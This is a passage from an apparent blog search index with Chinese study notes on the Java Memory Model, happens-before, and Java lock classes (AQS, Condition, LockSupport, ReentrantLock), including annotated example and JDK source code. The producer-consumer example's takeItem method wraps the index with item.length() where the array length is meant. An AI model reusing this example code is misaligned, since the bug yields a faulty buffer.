fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzUzODI2MTE0L2Fuc3dlci8yMzYzNjMxMjY=\">https://www.zhihu.com/question/53826114/answer/236363126<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["多线程学习"],"tags":["多线程","同步","synchronized","volatile"]},{"title":"Java内存模型","url":"/2017/12/14/Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/","content":"<p>在物理机中，为了加快处理器与内存交互速度，在处理器中引入了高速缓存，将运算需要使用到的数据复制到缓存中，运算结束后再从缓存同步到内存中。这样在多线程处理数据时，可能会导致不同处理器中缓存数据不一致，这个时候引入了缓存一致性协议，这样能保证一个处理器修改了数据，其他处理也能看到最新的数据。</p>\n<p>在Java虚拟机规范中定义了一种Java内存模型（Java Memory Model， JMM）来屏蔽各种硬件和操作系统的内存访问差异，让Java程序在不同平台都能达到一致的内存访问效果。（JDK1.5之后内存模型才相对完善）</p>\n<p>在Java中，所有实例域、静态域和数组元素存储在堆内存中，堆内存在线程之间共享（代指实例域，静态域和数组元素）。局部变量（Local variables），方法定义参数（java语言规范称之为formal method parameters）和异常处理器参数（exception handler parameters）不会在线程之间共享，它们不会有内存可见性问题，也不受内存模型的影响。</p>\n<p>Java内存模型规定了共享变量存储在主内存中，每条线程都有自己的工作内存（线程本地内存），工作内存中存储被该线程使用到的变量的主内存的副本（不是整个对象的内存复制，对象的引用、线程访问的字段）。如图：<br><img src=\"/images/old/20171214%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-14%E4%B8%8A%E5%8D%8810.21.02.png\"></p>\n<span id=\"more\"></span>\n<p>在该图中，如果线程A修改了本地变量，然后把本地变量更新到主内存中，然后线程B把主内存中变量同步到本地内存中。<br>内存图：<br><img src=\"/images/old/20171214%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-14%E4%B8%8A%E5%8D%8810.29.08.png\"><br><img src=\"/images/old/20171214%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-14%E4%B8%8A%E5%8D%8811.56.09.png\"></p>\n<p>这样就引出两个问题：</p>\n<ol>\n<li>线程A修改了本地变量，怎么同步到主内存中</li>\n<li>线程B怎么同步主内存数据到本地内存中</li>\n</ol>\n<h3 id=\"内存交互\"><a href=\"#内存交互\" class=\"headerlink\" title=\"内存交互\"></a>内存交互</h3><p>对于工作内存与主内存之间交互协议，Java内存模型定义了8种操作来完成，虚拟机实现时，必须保证每种操作都是原子（对于double、long，允许 load、store、read、write操作在某些平台上例外）。</p>\n<table>\n<thead>\n<tr>\n<th>-</th>\n<th align=\"left\">作用域</th>\n<th align=\"left\">用途</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>lock（锁定）</td>\n<td align=\"left\">主内存变量</td>\n<td align=\"left\">把一个变量标识为一条线程独占</td>\n</tr>\n<tr>\n<td>unlock（解锁）</td>\n<td align=\"left\">主内存的变量</td>\n<td align=\"left\">把一个处于锁定状态的变量释放，释放后的变量才可以被别的变量锁定</td>\n</tr>\n<tr>\n<td>read（读取）</td>\n<td align=\"left\">主内存的变量</td>\n<td align=\"left\">把一个变量值从主内存中传输到线程的工作内存中，以便后续load使用</td>\n</tr>\n<tr>\n<td>load（载入）</td>\n<td align=\"left\">工作内存变量</td>\n<td align=\"left\">把read操作从主内存中得到的变量放入工作内存变量副本中</td>\n</tr>\n<tr>\n<td>use（使用）</td>\n<td align=\"left\">工作内存变量</td>\n<td align=\"left\">把工作内存中变量传递到执行引擎，当虚拟机遇到需要使用该变量值的字节码指令时，会执行该操作</td>\n</tr>\n<tr>\n<td>assign（赋值）</td>\n<td align=\"left\">工作内存变量</td>\n<td align=\"left\">把执行引擎接收到的值，赋值给工作内存的变量，当虚拟机遇到一个给变量赋值的字节码指令时执行该操作</td>\n</tr>\n<tr>\n<td>store（存储）</td>\n<td align=\"left\">工作内存变量</td>\n<td align=\"left\">把工作内存中的变量值传送到主内存中，以便随后write使用</td>\n</tr>\n<tr>\n<td>write（写入）</td>\n<td align=\"left\">主内存变量</td>\n<td align=\"left\">把store操作从工作内存中获取的变量写入到主内存中</td>\n</tr>\n</tbody></table>\n<p>Java中定义了改8种操作，如果把主内存中数据复制到工作内存中，必须顺序执行read–&gt;load（并不一定连续，中间可插入其他指令），同时还规定了必须满足以下规则。</p>\n<ul>\n<li>read、load、store、write不能单独出现，不能read后没有load，store后没有write。</li>\n<li>不能丢弃assign</li>\n<li>不能没有assign操作，之后同步工作内存到主内存</li>\n<li>新变量只能在主内存中出现，不允许在工作内存中使用未初始化变量（未执行load、assign），也就是必须先load或者assign、才能操作use或者store</li>\n<li>一个变量同一时间只能一个线程进行lock，lock可以被同一线程多次执行，多次执行lock后需要多次执行unlock才解锁</li>\n<li>未lock不能unlock，不允许unlock其他线程锁定的变量</li>\n<li>对变量unlock之前，必须先把改变量同步到主内存中。</li>\n</ul>\n<p>对于long和double（64位数据类型），虚拟机允许没有没volatile修饰的变量读写操作（load、store、read、write）拆分为2次32位操作来进行（非原子性协议）。虽然Java内存模型允许不把long和double的读写实现为原子操作，但允许虚拟机把改操作实现为原子操作，当前个平台几乎都是作为原子操作实现。</p>\n<h3 id=\"原子性、可见性、有序性\"><a href=\"#原子性、可见性、有序性\" class=\"headerlink\" title=\"原子性、可见性、有序性\"></a>原子性、可见性、有序性</h3><p>Java内存模型在并发过程中主要围绕原子性、可见性、有序性：</p>\n<ul>\n<li>原子性：由内存模型直接保证原子性，所以常用的读写是具备原子性，如果需要大范围原子性，需要使用到lock、unlock，用户无法直接使用lock和unlock，但是提供了字节码指令monitorenter、monitorexit，隐式使用lock、unlock，synchronized编译后就是使用的该字节码指令。</li>\n<li>可见性：当一个线程修改了共享变量的值，其他线程能够立即得知这个修改。Java内存模型是通过在变量修改后将新值同步回主内存中，在变量读取前，从主内存中刷新变量值这种依赖主内存作为传递媒介的方式来实现可见性。Java中除了volatile外还有synchronized和final实现可见性，synchronized通过unlock前必须同步到主内存中实现。final实现的关键字在构造器中一旦初始化完成，并且构造器没有把this应用传递出去，那么其他线程中就能看见final字段的值(具体可搜索final可见性、JSR-133final增强)。</li>\n<li>有序性：一个线程观察其他线程中的指令执行顺序，由于指令重排序的存在，该观察结果一般杂乱无序。但是在本线程内观察，所有操作都是有序的。volatile和synchronized两个关键字保证了线程之间操作的有序性。</li>\n</ul>\n<h3 id=\"hanpens-before\"><a href=\"#hanpens-before\" class=\"headerlink\" title=\"hanpens-before\"></a>hanpens-before</h3><p>编译器和处理器为了优化程序性能，可能会对指令顺序重排序，在单线程下，重排序并不会影响运行结果，但是再多线程下，重排序会导致各种问题出现。为了避免这种问题，JMM使用了hanpens-before这一规则。<br>happens-before规则对于会改变查询执行结果的重排序（指单线程和正确同步的多线程），禁止编译器和处理器重排序。对于不会改变执行结果的重排序，并不禁止。<br>其他概念参考：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbnNfY29kZS9hcnRpY2xlL2RldGFpbHMvMTczNDgzMTM=\">http://blog.csdn.net/ns_code/article/details/17348313<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"内存屏障\"><a href=\"#内存屏障\" class=\"headerlink\" title=\"内存屏障\"></a>内存屏障</h3><p>可参考：<span class=\"exturl\" data-url=\"aHR0cDovL2dlZS5jcy5vc3dlZ28uZWR1L2RsL2ptbS9jb29rYm9vay5odG1s\">http://gee.cs.oswego.edu/dl/jmm/cookbook.html<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>并不是非常理解这一部分：<br>相关资料：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jcy51bWQuZWR1L35wdWdoL2phdmEvbWVtb3J5TW9kZWwv\">http://www.cs.umd.edu/~pugh/java/memoryModel/<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pbmZvcS5jb20vY24vYXJ0aWNsZXMvamF2YS1tZW1vcnktbW9kZWwtMQ==\">http://www.infoq.com/cn/articles/java-memory-model-1<i class=\"fa fa-external-link-alt\"></i></span><br>参考：《深入Java虚拟机》</p>\n","categories":["多线程学习"],"tags":["多线程","同步","JMM","内存模型"]},{"title":"Java锁","url":"/2017/12/18/Java%E9%94%81/","content":"<p>在Java线程基础中使用过synchronized，在JDK5一起，同步都是基于synchronized，在场景非常复杂的地方，使用synchronized不方便，JDK5引入了Lock。在包java.util.concurrent.locks中就有锁相关的类。</p>\n<h3 id=\"AbstractOwnableSynchronizer\"><a href=\"#AbstractOwnableSynchronizer\" class=\"headerlink\" title=\"AbstractOwnableSynchronizer\"></a>AbstractOwnableSynchronizer</h3><p>抽象独占同步锁。提供设置当前拥有独占访问的线程，获取设置的独占线程。<br>只能子类构造。</p>\n<h3 id=\"AbstractQueuedSynchronizer\"><a href=\"#AbstractQueuedSynchronizer\" class=\"headerlink\" title=\"AbstractQueuedSynchronizer\"></a>AbstractQueuedSynchronizer</h3><p>抽象队列同步，继承AbstractOwnableSynchronizer。通过队列先进先出来实现等待队列的阻塞，内部维护一个线程链表Node。在获取锁失败后，会生成Node节点，并放入链表末尾，直到等待超时或者线程中断或被上一个节点唤醒。其节点等待状态waitStatus有：</p>\n<ul>\n<li>0：节点刚被初始化状态，或者可能已经完成状态</li>\n<li>CANCELLED（1）：取消状态，需要取消该节点时设置的状态</li>\n<li>SIGNAL（-1）：节点等待状态</li>\n<li>CONDITION（-2）：节点在等待队列中，在调用Condition.signal()之后会变为SIGNAL状态进入等待获取锁队列</li>\n<li>PROPAGATE（-3）：共享同步状态</li>\n</ul>\n<p>AbstractQueuedSynchronizer内部通过Unsafe.compareAndSet（原子操作int）来操作内存，保证线程的同步。其他API可查看相关文档。</p>\n<h3 id=\"AbstractQueuedLongSynchronizer\"><a href=\"#AbstractQueuedLongSynchronizer\" class=\"headerlink\" title=\"AbstractQueuedLongSynchronizer\"></a>AbstractQueuedLongSynchronizer</h3><p>同AbstractQueuedSynchronizer，只不过AbstractQueuedLongSynchronizer内部通过long字段来实现原子操作。当创建需要 64 位状态的多级别锁和屏障等同步器时使用。</p>\n<span id=\"more\"></span>\n<h3 id=\"Condition\"><a href=\"#Condition\" class=\"headerlink\" title=\"Condition\"></a>Condition</h3><p>实际是将Object中监视器方法（wait、notify 和 notifyAll）分解成截然不同的对象，通过和Lock.newCondition()结合使用。通过Condition实现生产者消费者模型。例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Condition</span> <span class=\"variable\">emptyCondition</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Condition</span> <span class=\"variable\">fullCondition</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> count, putIndex, takeIndex;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String[] items = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[<span class=\"number\">100</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addItem</span><span class=\"params\">(String str)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            lock.lock();</span><br><span class=\"line\">            <span class=\"comment\">//数组已经满了</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (items.length == count) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;数据已满&quot;</span>);</span><br><span class=\"line\">                fullCondition.await();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//放置</span></span><br><span class=\"line\">            items[putIndex] = str;</span><br><span class=\"line\">            <span class=\"comment\">//如果已经到了末尾，重新放置</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (++putIndex == items.length) putIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">            count++;</span><br><span class=\"line\">            emptyCondition.signal();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;放入：&quot;</span> + str);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">takeItem</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            lock.lock();</span><br><span class=\"line\">            <span class=\"comment\">//数组为空</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (count == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;数据为空&quot;</span>);</span><br><span class=\"line\">                emptyCondition.await();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//取出</span></span><br><span class=\"line\">            item = items[takeIndex];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (++takeIndex == item.length())takeIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">            --count;</span><br><span class=\"line\">            fullCondition.signal();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;取出：&quot;</span> + item);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> item;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Main</span> <span class=\"variable\">main</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Main</span>();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt;&#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                    <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">simpleDateFormat</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss SS&quot;</span>);</span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> simpleDateFormat.format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>());</span><br><span class=\"line\">                    main.addItem(format);</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;).start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                    main.takeItem();</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;).start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Lock\"><a href=\"#Lock\" class=\"headerlink\" title=\"Lock\"></a>Lock</h3><p>Lock 实现提供了比使用 synchronized 方法和语句可获得的更广泛的锁定操作。此实现允许更灵活的结构，可以具有差别很大的属性，可以支持多个相关的 Condition 对象。</p>\n<h3 id=\"LockSupport\"><a href=\"#LockSupport\" class=\"headerlink\" title=\"LockSupport\"></a>LockSupport</h3><p>用来创建锁和其他同步类的基本线程阻塞原语。一般采用其中park、unparkt，作用和wart、notify类似，但其实现原理不一样，而且不需要依赖监视器，和wart、notify无交集使用更加灵活。<br>例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">blocker</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;blocker&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Thread</span> <span class=\"variable\">thread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;线程开始&quot;</span>);</span><br><span class=\"line\">            LockSupport.park(blocker);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;线程结束&quot;</span>);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        thread.start();</span><br><span class=\"line\">        TimeUnit.SECONDS.sleep(<span class=\"number\">5</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;重新启动线程&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//中断线程也会解除阻塞，不会报错</span></span><br><span class=\"line\"><span class=\"comment\">//        thread.interrupt();</span></span><br><span class=\"line\">        LockSupport.unpark(thread);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"ReentrantLock\"><a href=\"#ReentrantLock\" class=\"headerlink\" title=\"ReentrantLock\"></a>ReentrantLock</h3><p>Lock子类，提供可重入互斥锁。如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ReentrantLock</span> <span class=\"variable\">reentrantLock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Main</span>().lockTest();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">lockTest</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        reentrantLock.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;do something&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            reentrantLock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过ReentrantLock.lock()获取锁，之后释放锁。释放锁最好放入finally，避免因为锁未释放导致出现问题。<br>在ReentrantLock内部抽象类Sync继承AbstractQueuedSynchronizer，用于同步控制，同时Sync有两个子类NonfairSync（非公平）、FairSync（公平）。</p>\n<h4 id=\"FairSync\"><a href=\"#FairSync\" class=\"headerlink\" title=\"FairSync\"></a>FairSync</h4><p>使用公平锁，new ReentrantLock(true)，在使用公平锁获取锁时。</p>\n<p>调用ReentrantLock.lock获取锁，因为是公平锁，最后调用的是FairSync.lock，FairSync调用父类AbstractQueuedSynchronizer.acquire获取锁，之后调用子类方法FairSync.tryAcquire 试图获取锁获取锁。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">tryAcquire</span><span class=\"params\">(<span class=\"type\">int</span> acquires)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Thread</span> <span class=\"variable\">current</span> <span class=\"operator\">=</span> Thread.currentThread();</span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程锁状态</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> getState();</span><br><span class=\"line\">    <span class=\"comment\">//未锁定</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * 1. 判断链表中需要处理的是否当前线程（头尾一致都为null，或者下一个节点为当前线程）</span></span><br><span class=\"line\"><span class=\"comment\">         * 2. 尝试Unsafe修改当前状态为锁定状态，获取锁</span></span><br><span class=\"line\"><span class=\"comment\">         * 3. 设置当前线程为锁持有</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class=\"line\">                compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">            setExclusiveOwnerThread(current);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//已经锁定，锁定线程为当前线程（重入）</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//重入计数</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">nextc</span> <span class=\"operator\">=</span> c + acquires;</span><br><span class=\"line\">        <span class=\"comment\">//数据溢出</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//设置重入值</span></span><br><span class=\"line\">        setState(nextc);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//获取锁失败</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>获取锁成功后直接返回</li>\n<li>获取锁失败后，生成Node节点放入等待列表，AbstractQueuedSynchronizer.addWaiter</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> Node <span class=\"title function_\">addWaiter</span><span class=\"params\">(Node mode)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//生成节点 model为null</span></span><br><span class=\"line\">    <span class=\"type\">Node</span> <span class=\"variable\">node</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>(Thread.currentThread(), mode);</span><br><span class=\"line\">    <span class=\"comment\">// 获取末节点</span></span><br><span class=\"line\">    <span class=\"type\">Node</span> <span class=\"variable\">pred</span> <span class=\"operator\">=</span> tail;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pred != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        node.prev = pred;</span><br><span class=\"line\">        <span class=\"comment\">//设置末节点为当前节点</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//设置上一个末节点下一个节点为当前节点</span></span><br><span class=\"line\">            pred.next = node;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> node;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//没有末节点，或者设置当前节点为末节点失败，自旋重试</span></span><br><span class=\"line\">    enq(node);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> node;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> Node <span class=\"title function_\">enq</span><span class=\"params\">(<span class=\"keyword\">final</span> Node node)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> tail;</span><br><span class=\"line\">        <span class=\"comment\">//如果链表未初始化完成</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t == <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// Must initialize</span></span><br><span class=\"line\">            <span class=\"comment\">//初始化链表，设置链表头为一个空节点</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndSetHead(<span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>()))</span><br><span class=\"line\">                <span class=\"comment\">//设置头尾节点一致，进入第二次循环</span></span><br><span class=\"line\">                tail = head;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//设置当前节点上一个节点为末节点</span></span><br><span class=\"line\">            node.prev = t;</span><br><span class=\"line\">            <span class=\"comment\">//设置当前节点为末节点</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//设置上一个末节点下一个节点为当前节点</span></span><br><span class=\"line\">                t.next = node;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置链表完成后，开始循环处理队列，直到轮到当前节点AbstractQueuedSynchronizer.acquireQueued</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">acquireQueued</span><span class=\"params\">(<span class=\"keyword\">final</span> Node node, <span class=\"type\">int</span> arg)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">failed</span> <span class=\"operator\">=</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">boolean</span> <span class=\"variable\">interrupted</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取当前节点上一个节点</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">Node</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> node.predecessor();</span><br><span class=\"line\">            <span class=\"comment\">//判断上一个节点是否为头节点，如果是，尝试获取节点，逻辑在上述tryAcquire中</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//当前节点获取锁后，设置当前节点为链表头</span></span><br><span class=\"line\">                setHead(node);</span><br><span class=\"line\">                <span class=\"comment\">//把原头结点的下一个节点设置为null，方便GC回收</span></span><br><span class=\"line\">                p.next 